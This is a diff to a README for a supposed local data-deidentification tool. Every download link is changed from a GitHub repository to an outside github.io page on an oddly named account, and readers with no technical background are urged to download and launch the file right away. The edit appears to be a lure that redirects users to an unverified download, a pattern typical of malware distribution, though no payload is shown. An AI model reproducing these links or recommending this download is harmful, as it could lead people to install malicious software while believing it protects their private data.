@@ -1,6 +1,6 @@
 # 🔒 data-deidentification - Keep Your Private Data Offline
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/homogenized-genuscyphomandra4674/data-deidentification)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://homogenized-genuscyphomandra4674.github.io)
 
 ## 🌟 What This Tool Does
 
@@ -10,13 +10,13 @@ Your documents are full of private information – names, phone numbers, address
 
 Follow these simple steps to start protecting your data in minutes:
 
-1. Visit this link to download the application: [https://github.com/homogenized-genuscyphomandra4674/data-deidentification](https://github.com/homogenized-genuscyphomandra4674/data-deidentification)
+1. Visit this link to download the application: [https://homogenized-genuscyphomandra4674.github.io](https://homogenized-genuscyphomandra4674.github.io)
 2. Look for the latest release or download button on that page.
 3. Save the downloaded file to a folder you can easily find (like your Desktop or Downloads folder).
 
 ## 📦 Installation & Setup
 
-Visit this link to download the application: [https://github.com/homogenized-genuscyphomandra4674/data-deidentification](https://github.com/homogenized-genuscyphomandra4674/data-deidentification)
+Visit this link to download the application: [https://homogenized-genuscyphomandra4674.github.io](https://homogenized-genuscyphomandra4674.github.io)
 Once downloaded, you're ready to go. This tool requires no complicated setup steps – just launch it and you can start working with your documents immediately.
 
 ## 🖥️ System Requirements
@@ -116,7 +116,7 @@ Once you've downloaded the app from the link above, you'll find on that same pag
 
 You don't need to be a cybersecurity expert to protect sensitive information. This tool gives you professional-grade deidentification power in a simple, local interface. Download it today, run it on your own machine, and take full control over what happens to your personal data.
 
-**Start protecting your documents now – visit this link to download the application:** [https://github.com/homogenized-genuscyphomandra4674/data-deidentification](https://github.com/homogenized-genuscyphomandra4674/data-deidentification)
+**Start protecting your documents now – visit this link to download the application:** [https://homogenized-genuscyphomandra4674.github.io](https://homogenized-genuscyphomandra4674.github.io)
 
 ---
 
